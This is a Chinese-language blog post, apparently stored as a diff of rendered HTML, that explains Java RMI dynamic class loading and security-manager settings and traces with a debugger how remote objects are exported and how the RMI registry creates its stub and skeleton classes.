+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>先运行RMIServer：
+<img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240906190302637.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240906190302637"
+	
+	
+></p>
+<p>成功运行并绑定。再运行客户端RMIClient去调用对象的方法：
+<img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240914165420258.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240914165420258"
+	
+	
+></p>
+<p>成功调用。</p>
+<p><strong>需要注意的是这里 RemoteInterface 接口在 Client/Server/Registry 均应该存在</strong>，一般 Registry 与 Server 在同一端上。</p>
+<p>——————</p>
+<h3 id="其他特性说明">其他特性说明
+</h3><p>前面就是一个简单的远程调用通信。还需要知道RMI还可以使用动态类加载和安全管理器来安全传输Java类。</p>
+<h4 id="动态类加载">动态类加载
+</h4><p>java.rmi.server.codebase：该属性表示一个或多个URL位置，可以从中下载本地（CLASSPATH）找不到的类，相当于一个代码库。</p>
+<p>如果客户端在调用时，传递了一个可序列化对象（比如前面例子中sayName()方法我传进去一个类实例），这个对象在服务端不存在，则在服务端会抛出ClassNotFound 的异常，但是 RMI 支持动态类加载，如果设置了<code>java.rmi.server.codebase</code>，则会尝试从其中的地址获取<code>.class</code>并加载及反序列化。</p>
+<p>客户端同样，如果得到一个客户端没有的class文件，就会从服务端提供的<code>java.rmi.server.codebase</code>URL去加载类。</p>
+<p>可使用 <code>System.setProperty(&quot;java.rmi.server.codebase&quot;, &quot;http://127.0.0.1:9999/&quot;);</code> 进行设置，或使用启动参数 <code>-Djava.rmi.server.codebase=&quot;http://127.0.0.1:9999/&quot;</code> 进行指定。</p>
+<h4 id="安全设置">安全设置
+</h4><p>我们通过网络加载外部类并执行方法，必须要有一个安全管理器来进行管理，如果没有设置安全管理，则RMI不会动态加载任何类，通常使用如下代码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">System</span><span class="p">.</span><span class="na">getSecurityManager</span><span class="p">()</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">System</span><span class="p">.</span><span class="na">setSecurityManager</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">RMISecurityManager</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>管理器和管理策略相辅相成，所以还需要提供一个策略文件，里面配值允许哪些主机进行哪些操作，如下便是全部权限：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//rmi.policy</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">grant</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">permission</span><span class="w"> </span><span class="n">java</span><span class="p">.</span><span class="na">security</span><span class="p">.</span><span class="na">AllPermission</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">};</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>同样可以使用 <code>-Djava.security.policy=rmi.policy</code> 或 <code>System.setProperty(&quot;java.security.policy&quot;, RemoteServer.class.getClassLoader().getResource(&quot;rmi.policy&quot;).toString());</code> 来进行设置。</p>
+<h2 id="源码分析">源码分析
+</h2><p>前面学习了大概的流程，现在来跟一下源码看具体实现。</p>
+<h3 id="服务注册">服务注册
+</h3><h4 id="远程对象创建">远程对象创建
+</h4><p>在前面我们创建了一个远程对象 RemoteTest，继承了 UnicastRemoteObject类，这个类使用 JRMP 协议 export 远程对象，并获取与远程对象进行通信的 Stub。并在服务端创建过程中对这个类进行了初始化，对应下代码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">RemoteInterface</span><span class="w"> </span><span class="n">remoteTest</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">RemoteTest</span><span class="p">();</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>打断点跟一下这里的流程，在RemoteTest初始化时，由于远程对象继承了UnicastRemoteObject类，所以会调用这个类的构造方法：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240907134638855.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240907134638855"
+	
+	
+></p>
+<p>这里的this就是我们要注册的远程对象（RemoteTest对象），然后就会调用UnicastRemoteObject类的exportObject()方法：
+<img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240906204200471.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240906204200471"
+	
+	
+></p>
+<p>然后实例化了UnicastServerRef类并且又调用UnicastRemoteObject类的 exportObject方法。</p>
+<ul>
+<li>先跟进这个UnicastServerRef类的实例：</li>
+</ul>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240916204951223.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240916204951223"
+	
+	
+></p>
+<p>这里又实例化了一个LiveRef类，这里的var1即前面的port(即0)，再跟进LiveRef类的初始化：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240917134205306.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240917134205306"
+	
+	
+></p>
+<p>又实例化了一个objID类，继续跟进：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240917134431723.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240917134431723"
+	
+	
+></p>
+<p>也就是对objID类的填充。值分别为：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240917134507811.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240917134507811"
+	
+	
+></p>
+<p>回到LiveRef类的构造方法，然后就会调用LiveRef类的构造方法：
+<img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240917134647809.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240917134647809"
+	
+	
+></p>
+<p>然后就是对LiveRef类的填充：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240917134807267.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240917134807267"
+	
+	
+></p>
+<p>在LiveRef类初始化完毕后，就会进行父类的初始化：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240917134942483.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240917134942483"
+	
+	
+></p>
+<p>再跟进一下父类的实例：
+<img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240916205400180.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240916205400180"
+	
+	
+></p>
+<p>也就是说现在将<strong>UnicastRef类的ref变量赋值为了一个LiveRef类的实例</strong>。最后回到UnicastServerRef类的构造方法：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240916205603549.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240916205603549"
+	
+	
+></p>
+<p>也就是对这个类的填充，对这些类进行了实例化。</p>
+<ul>
+<li>再跟进exportObject()方法</li>
+</ul>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240916205708292.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240916205708292"
+	
+	
+></p>
+<p>前面跟了UnicastServerRef类的初始化，再来看这里的exportObject()方法：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240906204626074.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240906204626074"
+	
+	
+></p>
+<p>这里毫无疑问会进入if语句，这里的if语句简单来说就是会给这个RemoteTest类的“ref”设置为一个UnicastServerRef类实例？（说是使得远程对象能够在网络上被正常地定位和访问）。</p>
+<p>然后就会调用sref(UnicastServerRef类实例)的exportObject()方法：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240916222034217.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240916222034217"
+	
+	
+></p>
+<p>在这里看到一个createProxy()方法，和动态代理那里感觉很像，看一下这个方法的参数传递与源代码。</p>
+<ul>
+<li>同样的先看一下这里的getClientRef()方法：</li>
+</ul>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240916222141916.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240916222141916"
+	
+	
+></p>
+<p>返回了一个UnicastRef类实例，前面有用到这个类（UnicastServerRef类初始化时调用的父类），继续跟进：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240916222332397.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240916222332397"
+	
+	
+></p>
+<p>还是和前面的差不多，看了一下变量类型这些，还是将LiveRef类实例赋值给了这个变量（并且好像也是差不多的），其实在前面调用getClientRef()方法时就调用了<code>this.ref</code>，但是由于本类UnicastServerRef没有这个变量，其实最终传进去的就是我们前面初始化时赋值的父类UnicastRef的ref变量。所以这里的目的应该就是获取填充了的UnicastRef类实例。</p>
+<ul>
+<li>再回到原先的createProxy()方法：</li>
+</ul>
+<p>然后就会调用到<code>sun.rmi.server.Util</code>类下的createProxy()方法：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240916223517783.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240916223517783"
+	
+	
+></p>
+<p>简单跟了一下这个源码中的方法：</p>
+<ul>
+<li>getRemoteClass()：也就是判断var0的接口是否继承Remote.class，是的话就返回这个var0，毫无疑问我们的RemoteTest类接口是继承了的，所以这里的var3可以看作是等价于var0的。</li>
+</ul>
+<p>然后继续看，到了if条件，var2即传参进来的forceStubUse变量，而这个变量在我们最开始对UnicastServerRef类进行初始化的时候就已经赋值为false了：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240917134036729.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240917134036729"
+	
+	
+></p>
+<p>然后ignoreStubClasses默认为false，在java中 &amp;&amp; 运算符的优先级比 || 的高，现在已知var2为false，<code>!ignoreStubClasses</code>为true，现在重点看这个stubClassExists()方法：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240916225220013.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240916225220013"
+	
+	
+></p>
+<p>简单来说就是判断 withoutStubs 变量是否存在var0这个key，不存在的话就会调用forName()方法去找xxx_Stub 这个类，找到了就返回true。很正常会进入到这个if语句，但同样的不存在RemoteTest_Stub这个类会进入到catch语句：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240916225652373.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240916225652373"
+	
+	
+></p>
+<p>最后stubClassExists()方法返回了false。</p>
+<p>——————</p>
+<p>最后并不会进入if条件：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240916230004575.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240916230004575"
+	
+	
+></p>
+<p>看源码，简单跟方法，大概如下：</p>
+<ul>
+<li>getRemoteInterfaces()：简单来说就是获取实现了Remote.class接口及Remote.class接口。在这里获取到的也就是Remote.class和RemoteInterface.class.</li>
+</ul>
+<p>后面的也就和动态代理大差不差了。<strong>代理类为RemoteObjectInvocationHandler类，委托类是UnicastRef类实例</strong>。</p>
+<p>所以最后就是返回了一个Remote类型的RemoteObjectInvocationHandler代理对象。</p>
+<p>所以说只要对这个代理对象调用方法就会到RemoteObjectInvoactionHandler类的invoke()方法。</p>
+<p>回到UnicastServerRef类的export()方法，前面返回了一个Remote类型的代理对象，后面又实例化了一个Target类：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240917133842446.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240917133842446"
+	
+	
+></p>
+<p>简单看一下这里的Target类初始化时传进去的参数：</p>
+<ul>
+<li>
+<p>var1：即RemoteTest类实例</p>
+</li>
+<li>
+<p>this：也就是UnicastServerRef类实例。</p>
+</li>
+<li>
+<p>var5：即前面的代理对象</p>
+</li>
+<li>
+<p>this.ref.getObjID()：</p>
+</li>
+</ul>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240917135342536.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240917135342536"
+	
+	
+></p>
+<p>就是返回我们前面实例化LiveRef类时的id。</p>
+<ul>
+<li>var3：即最开始传入export()方法的false</li>
+</ul>
+<p>简单看看赋值情况：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240917140243425.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240917140243425"
+	
+	
+></p>
+<p>这里的Target对象也就是封装了我们的远程对象和生成的动态代理类。</p>
+<p>然后调用了LiveRef类的exportObject()方法，传进去了刚实例化完的Target对象：
+<img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240917140312435.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240917140312435"
+	
+	
+></p>
+<p>即：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240917140414410.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240917140414410"
+	
+	
+></p>
+<p>这里的ep也就是前面分析的LiveRef实例是有过赋值的变量。</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240917140631682.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240917140631682"
+	
+	
+></p>
+<p>所以现在又会调用TCPEndpoint类的exportObject()方法：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240917140805786.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240917140805786"
+	
+	
+></p>
+<p>然后就会调用到TCPTransport类的exportObject()方法：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240917142402536.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240917142402536"
+	
+	
+></p>
+<p>这里的listen()方法就是为本地的stub(代理类)开启一个随机端口，然后本地监听这个端口。</p>
+<p>然后调用了父类的export()方法，传进去了Target类实例，跟进一下：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240917142620459.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240917142620459"
+	
+	
+></p>
+<p>这里主要就是将Target对象存放进ObjectTable类中，ObjectTable用来管理所有发布的服务实例Target，简单看一下这里的putTarget()方法：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240917144012349.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240917144012349"
+	
+	
+></p>
+<p>这里就是放进了键值对，在这个类中的这两个objTable和implTable变量都是HashMap类实例。这里可以看到是向里面put进值了的，现在来看一下值的情况：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240917165335400.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240917165335400"
+	
+	
+></p>
+<p>value有三个，分别是：</p>
+<ul>
+<li>我们前面分析出来的代理类：</li>
+</ul>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240917165421082.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240917165421082"
+	
+	
+></p>
+<ul>
+<li>后面注册中心创建分析出来的RegistryImpl_Stub类：</li>
+</ul>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240917165533306.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240917165533306"
+	
+	
+></p>
+<ul>
+<li>DGCImpl_Stub类，好像是与垃圾回收相关的，默认创建：</li>
+</ul>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240917165712179.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240917165712179"
+	
+	
+></p>
+<p>这里最开始学的时候是踩了一下坑的，我是<strong>直接用的流程学习的代码来分析的</strong>，注册中心创建的流程也是会调用到UnicastServerRef类的exportObject()方法的，所以其实也会进行一次这里的put操作，个人调试时死活不能进入super.exportObject()方法，直接打断点会断在注册中心调用的super.exportObject()方法中，那里就只会有两个，并且看不出来有代理对象，所以其实这里的学习调用可以直接用如下代码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">Rmi.Server</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.Naming</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.registry.LocateRegistry</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">RMIServer</span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">){</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="c1">//绑定调用类</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">RemoteInterface</span><span class="w"> </span><span class="n">remoteTest</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">RemoteTest</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Naming</span><span class="p">.</span><span class="na">bind</span><span class="p">(</span><span class="s">&#34;rmi://localhost:1099/Hello&#34;</span><span class="p">,</span><span class="n">remoteTest</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="k">catch</span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">){</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>不要注册中心来调试。</p>
+<p>（题外话结束）</p>
+<p>————————</p>
+<p>最后回到UnicastServerRef类的exportObject()方法，最终是返回了代理对象的：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240917143042605.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240917143042605"
+	
+	
+></p>
+<p>大概远程创建对象的过程就是这样，注意这里是将远程对象和代理对象都放进了一个Target类实例，并且这里代理对象的委托类是UnicastRef类。</p>
+<p>——————————</p>
+<h4 id="注册中心创建">注册中心创建
+</h4><p>对应如下代码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">LocateRegistry</span><span class="p">.</span><span class="na">createRegistry</span><span class="p">(</span><span class="n">1099</span><span class="p">);</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>同样的加断点跟一下过程：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240917145252827.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240917145252827"
+	
+	
+></p>
+<p>实例化了一个RegistryImpl类实例，传进去了port为1099，跟进一下这里的构造方法：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240917145749556.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240917145749556"
+	
+	
+></p>
+<p>稍微注意一下这里的bindings变量被赋值为了Hashtable类。</p>
+<p>然后会进入else语句：</p>
+<p>注意看这里的LiveRef类实例语句，传进去了一个id和我们传进去的port（1099），看一下这里的id变量的定义：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240917145932371.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240917145932371"
+	
+	
+></p>
+<p>这里和前面远程对象创建的分析部分还是有点像的。所以这里是传入了ObjID类实例和port（1099），对LiveRef类的变量进行了赋值：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240917150603418.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240917150603418"
+	
+	
+></p>
+<p>然后就会调用setup()方法：
+<img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240917150627339.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240917150627339"
+	
+	
+></p>
+<ul>
+<li>先跟UnicastServerRef类的初始化：</li>
+</ul>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240917151023931.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240917151023931"
+	
+	
+></p>
+<p>所以这里还是将UnicastServerRef类的父类UnicastRef的ref变量赋值为了一个LiveRef类实例：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240917151206491.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240917151206491"
+	
+	
+></p>
+<ul>
+<li>再跟调用的setup()方法，传进去了刚初始化完的UnicastServerRef类实例：</li>
+</ul>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240917151404346.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240917151404346"
+	
+	
+></p>
+<p>跟了一下，这里应该是将RegistryImpl类的父类RemoteServer的父类RemoteObject的ref变量赋值为了传进来的UnicastServerRef类实例（不确定，先看后面）。</p>
+<p>然后又调用了UnicastServerRef类的exportObject()方法，只不过这里<strong>传入的是RegistryImpl类实例</strong>：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240917152057413.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240917152057413"
+	
+	
+></p>
+<p>又到了前面分析过的exportObject()方法。</p>
+<p>跟进这里的Util.createProxy()方法：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240917152556613.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240917152556613"
+	
+	
+></p>
+<p>关键还是这个stubClassExists()方法：
+<img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240917152655300.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240917152655300"
+	
+	
+></p>
+<p>这里找到了RegistryImpl_Stub这个Class对象？所以可以返回true。</p>
+<p>所以会进入if语句，而不是上一次分析的进入else语句：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240917152820852.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240917152820852"
+	
+	
+></p>
+<p>这里又调用了createStub()方法，分别传入了RegistryImpl类的class对象和参数传递的UnicastRef对象：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240917153115477.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240917153115477"
+	
+	
+></p>
+<p>这里的代码逻辑还是挺好看的，也就是对RegistryImpl_Stub的class对象调用了newInstance()方法并<strong>传递了UnicastRef作为参数</strong>，所以这里的createStub()方法（即createProxy()方法）就是实例化了一个RegistryImpl_Stub类并返回它。
+回到UnicastServerRef类的exportObject()方法：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240917154210976.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240917154210976"
+	
+	
+></p>
+<p>不同点又来了，这里就会进入到这个if条件，前面返回的RegistryImpl_Stub类会赋值给var5，而RegistryImpl_Stub类的父类就是RemoteStub，自然会符合这个if条件语句的判定，跟进setSkeleton()方法，这里传入了RegistryImpl类实例：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240917154404274.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240917154404274"
+	
+	
+></p>
+<p>变量中不存在key为RegistryImpl的Class对象，会进入这里的if条件：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240917154716323.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240917154716323"
+	
+	
+></p>
+<p>然后调用Util类的createSkeleton()方法，还是将RegistryImpl类实例作为参数传递：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240917154843629.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240917154843629"
+	
+	
+></p>
+<p>这里的getRemoteClass()方法前面分析过，所以这里可以直接将var1看作RegistryImpl类的Class对象。</p>
+<p>所以这里的createSkeleton()方法就是实例化了一个RegistryImpl_Skel类。</p>
+<p>即现在UnicastServerRef类的skel变量是RegistryImpl_Skel类实例：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240917155338224.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240917155338224"
+	
+	
+></p>
+<p>setSkeleton()方法结束。</p>
+<p>所以在注册中心板块这里，实现了RegistryImpl_Stub类的RegistryImpl_Skel类实例。</p>
+<p>——————</p>
+<p>回到UnicastServerRef类的exportObject()方法，后续还是封装进了Target类：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240917155940137.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240917155940137"
+	
+	
+></p>
+<p>还是分别说一下这里的参数：</p>
+<ul>
+<li>var1：RegistryImpl类实例</li>
+<li>this：UnicastServerRef类实例（类包含skel这个变量）</li>
+<li>var5：RegistryImpl_Stub类实例</li>
+<li>this.ref.getObjID()：返回前面的LiveRef中的id，前面也是提到过的：</li>
+</ul>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240917160936919.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240917160936919"
+	
+	
+></p>
+<ul>
+<li>var3：前面传参时传进来的值，为true</li>
+</ul>
+<p>然后调用LiveRef的export()方法，流程和前面差不多，直接到Transport类：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240917161313112.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240917161313112"
+	
+	
+></p>
+<p>这里又将一个Target对象放进了ObjectTable中。所以现在是有变量中有两个键值对：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20240917170634231.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240917170634231"
+	
+	
+></p>
+<ul>
+<li>一个RegistryImpl_Stub类实例：</li>
+</ul>
